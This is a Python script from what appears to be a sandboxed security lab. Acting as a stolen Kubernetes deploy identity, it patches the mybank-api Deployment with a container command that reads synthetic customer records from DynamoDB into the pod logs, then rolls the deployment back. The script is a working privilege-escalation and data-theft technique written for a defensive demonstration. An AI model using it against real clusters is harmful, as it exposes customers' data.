"""Prove the impact of the stolen deploy identity: it reaches synthetic customer data.

Authorized exercise in an owned sandbox against invented records. This runs the
post-credential steps of the documented attack (concept steps 22-24): the deploy identity can
only `patch` the mybank-api Deployment, but the pod runs under the app's service account, whose
EKS Pod Identity role can read the customer tables. So replacing the app's container command with
a reader turns deploy access into data access. It attempts to restore the app afterward.
Synthetic output can leave the cluster through logs shown on the owned operator machine.

Legacy supporting helper for a private-endpoint environment, not a current exercise step.
The current attack runs in GitHub via demo_probe.py against the lab's explicitly enabled
public EKS control-plane endpoint. Prepare enforcement_enabled=false through the GitHub
security control before a successful-attack run; see security/README.md. The old local
Terraform prevention toggle is retired. Nothing in this helper activates the control.
"""

import json
import subprocess
import time

from scripts.demo.kube import admin_kubectl
from scripts.demo.ops import activate, exe, outputs, step

DEPLOYER = ["--as=mybank-deployer", "--as-group=mybank:deployers"]
# Reader code for the hijacked container: no single quotes (it is shell single-quoted below).
READER = (
    "import boto3,os,json;"
    'c=boto3.client("dynamodb",region_name=os.environ.get("AWS_REGION","us-east-1"));'
    'print("STOLEN SYNTHETIC CUSTOMER RECORDS:");'
    '[print(json.dumps(c.get_item(TableName=os.environ["ACCOUNTS_TABLE"],'
    'Key={"account_id":{"S":a}}).get("Item"))) for a in ("acct-alice","acct-bob")];'
    '[print(json.dumps(c.get_item(TableName=os.environ["CUSTOMERS_TABLE"],'
    'Key={"customer_id":{"S":u}}).get("Item"))) for u in ("cust-alice","cust-bob")];'
    'print("---END---")'
)


def kctl(kubectl, *args, check=True, as_deployer=False, capture=True):
    command = [exe(kubectl[0]), *kubectl[1:], "-n", "mybank", *(DEPLOYER if as_deployer else []),
               *args]
    return subprocess.run(command, check=check, text=True,
                          capture_output=capture).stdout if capture else subprocess.run(
                              command, check=check)


def main():
    activate()
    values = outputs()
    with admin_kubectl(values) as kubectl:
        step("1. Confirm the stolen identity's scope (acting only as mybank:deployers)")
        for verb, target in (("patch", "deployment/mybank-api"), ("get", "secret/mybank-api"),
                             ("create", "pods")):
            allowed = kctl(kubectl, "auth", "can-i", verb, target, as_deployer=True,
                           check=False).strip()
            print(f"    can-i {verb} {target}: {allowed}")

        original = kctl(kubectl, "get", "deployment", "mybank-api",
                        "-o", "jsonpath={.spec.template.spec.containers[0].image}").strip()
        step("2. Abuse deploy access: replace the app container with a data reader")
        patch = {"spec": {"template": {"spec": {"containers": [{
            "name": "api", "command": ["sh", "-c", f"python -c '{READER}'; sleep 3600"],
            "livenessProbe": None, "readinessProbe": None, "startupProbe": None,
        }]}}}}
        kctl(kubectl, "patch", "deployment", "mybank-api", "--type=strategic",
             "-p", json.dumps(patch), as_deployer=True)
        print("    patched as mybank:deployers (no admin rights, no secret access)")

        step("3. The hijacked pod runs under the app identity and reads the customer tables")
        records = wait_for_records(kubectl)
        print(records or "    (no output captured yet; re-run kubectl logs)")

        step("4. Restore the legitimate app (as the operator, not the attacker)")
        kctl(kubectl, "rollout", "undo", "deployment/mybank-api", capture=False)
        kctl(kubectl, "rollout", "status", "deployment/mybank-api", "--timeout=180s", capture=False)
        print(f"    app restored to {original.split('@')[0]}@...")
    step("Impact shown: deploy identity -> app identity -> synthetic customer data. "
         "Detection catches the grab before this stage.")


def wait_for_records(kubectl) -> str:
    deadline = time.monotonic() + 180
    while time.monotonic() < deadline:
        time.sleep(10)
        logs = kctl(kubectl, "logs", "-l", "app.kubernetes.io/name=mybank-api",
                    "--tail=20", check=False)
        if "STOLEN SYNTHETIC CUSTOMER RECORDS" in logs:
            lines = logs.splitlines()
            start = next(i for i, line in enumerate(lines) if "STOLEN" in line)
            return "\n".join("    " + line for line in lines[start:])
    return ""


if __name__ == "__main__":
    main()
